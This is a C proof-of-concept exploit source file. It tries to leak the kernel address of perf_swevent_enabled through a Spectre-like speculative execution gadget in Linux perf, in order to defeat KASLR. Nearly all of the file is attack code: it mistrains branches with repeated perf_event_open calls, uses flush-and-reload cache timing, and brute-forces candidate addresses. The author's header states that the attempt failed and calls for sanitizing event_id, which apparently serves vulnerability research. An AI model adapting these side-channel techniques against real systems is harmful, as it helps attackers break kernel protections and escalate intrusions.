// Goal of this attack :
// - Leak address of kernel symbol "perf_swevent_enabled" via exploiting remaining spectre-like gadget.
// - If attacker can get the address, It can be exploited for bypassing security mechanism such as KASLR.
// 
// Assumption :
// - This is just PoC to show possibility which exploits remaining spectre-like gadget.
// - So This code requires several assumptions.
// --- No SMAP, No PTI (Page Table Isolation)
//
// Referenced CVE :
// - CVE-2013-2094
//
// Spectre-like gadget in perf :
// - perf_swevent_init() in kernel/events/core.c
//   if (event_id >= PERF_COUNT_SW_MAX)  ==> Bypass this check via speculative execution
//      return -ENOENT;
//   ....
//   ....
//   static_key_slow_inc(&perf_swevent_enabled[event_id]); 
//     ==> Attacker can control event_id. Try to access from here to leak area.
//
// Usage :
// $ gcc -o leak_perf_swevent leak_perf_swevent.c
// $ ./leak_perf_swevent ffffffff821c0400 ffffffff821c0500
//
// Result :
// - Failed to exploit
// - Why? Distance between bound-check-logic and access-logis is too far to be exploited.
// - even though failed to exploit, @event_id should be sanitized for security guarantee.
//
// Contact :
// - Jinbum Park <jinb.park7@gmail.com>
//
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <asm/unistd.h>

#define PERF_SWEVENT_ELEM_SIZE (24)
#define MMAP_MIN_ADDR (0x10000UL)

char *mmap_addr = NULL;
char user_leak_area[4096] __attribute__((aligned(4096))) = {0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0xa0,};
unsigned long kernel_leak_area;
int pkt_fd;

long perf_event_open(struct perf_event_attr *hw_event, pid_t pid,
					int cpu, int group_fd, unsigned long flags)
{
	int r;

	r = syscall(__NR_perf_event_open, hw_event, pid, cpu,
	                          group_fd, flags);
	return r;
}

void user_flush_cacheline(void *arg)
{
    asm volatile(
        "mov $0, %%eax\n\t"
        "cpuid\n\t" /* pleeeease don't do this speculatively :/ */
        "clflush %0"
	    : "+m" (*(volatile char *)arg)
	    : /* no inputs */
        : "ax", "bx", "cx", "dx");
}

int user_timed_reload(void *arg)
{
    int tsc1, tsc2, read_copy;
    asm volatile(
        "mov $0, %%eax\n\t"
        "cpuid\n\t" /* serialize; clobbers eax, ebx, ecx, edx */
        "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
        "mov %%eax, %0\n\t"
        "mov (%3), %%eax\n\t"
        "mov %%eax, %2\n\t"
        "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
        "mov %%eax, %1\n\t"
        : "=&r"(tsc1), "=&r"(tsc2), "=&r"(read_copy)
        : "r"((unsigned int *)arg)
        : "ax", "bx", "cx", "dx");
    return tsc2 - tsc1;
}

void try_speculative(unsigned long index)
{
	int i, ret;
	struct perf_event_attr pe;
	long long count;
	int fd;

	memset(&pe, 0, sizeof(struct perf_event_attr));
	pe.type = PERF_TYPE_SOFTWARE;
	pe.size = sizeof(struct perf_event_attr);
	pe.config = PERF_COUNT_SW_CONTEXT_SWITCHES;
	pe.disabled = 1;
	pe.exclude_kernel = 1;
	pe.exclude_hv = 1;

	// mistraining
	for (i=0; i<128; i++) {
		fd = perf_event_open(&pe, 0, -1, -1, 0);
		if (fd < 0) {
			printf("perf_event_open error\n");
			exit(0);
		}
		close(fd);
	}

	// speculative
	pe.config = index;
	fd = perf_event_open(&pe, 0, -1, -1, 0);
	if (fd < 0) {
		//printf("perf_event_open error - speculative\n");
	} else {
		close(fd);
	}
}

unsigned long cand_start, cand_end;
unsigned long calc_kernel_vaddr_from_bruteforce(void)
{
    int time, i, repeat, hit, max_hit = -1;
    unsigned long area, progress = 0;
	unsigned long index, offset, ret_addr = 0;

	printf("start bruteforce to get leak_area as kernel virtual address.\n");
	printf("first index : %lx\n", mmap_addr - cand_start);

    for (area=cand_start; area<cand_end; area+=32) {
        hit = 0;
		offset = mmap_addr - area;
		index = (offset / PERF_SWEVENT_ELEM_SIZE);

        for (repeat=0; repeat<100; repeat++) {
            user_flush_cacheline(mmap_addr);
            try_speculative(index);
            time = user_timed_reload(mmap_addr);
            if (time < 200) {
				hit++;
            }
        }
        if (hit > 0) {
            printf("Found kernel vaddr!! %lx, %d\n", area, hit);
			if (hit > max_hit) {
				ret_addr = area;
				max_hit = hit;
			}
        }

        progress++;
        if ((progress % (1<<8)) == 0) {
            printf("progress : %lx\n", area);
        }
    }

    return ret_addr;
}

void pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &set)) {
		printf("error\n");
		exit(-1);
	}
}

int main(int argc, char **argv)
{
	int ret;
	unsigned long addr;

	if (argc != 3) {
		printf("USAGE: ./poc <bruteforce start addr> <bruteforce end addr>\n");
		return 0;
	}
	cand_start = strtoull(argv[1], NULL, 16);
	cand_end = strtoull(argv[2], NULL, 16);

	if (mlock(user_leak_area, sizeof(user_leak_area)) != 0) {
		printf("mlock error\n");
		return 0;
	}

	mmap_addr = mmap(MMAP_MIN_ADDR, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
	if (mmap_addr == MAP_FAILED) {
		printf("mmap error\n");
		return 0;
	}
	printf("mmap_addr : %lx\n", (unsigned long)mmap_addr);
	if (mlock(mmap_addr, 4096) != 0) {
		printf("mlock error\n");
		return 0;
	}
	pin_cpu(0);

	addr = calc_kernel_vaddr_from_bruteforce();
	printf("perf_swevent_enabled addr : %lx\n", addr);

out:
	munmap(mmap_addr, 4096);
	return 0;
}
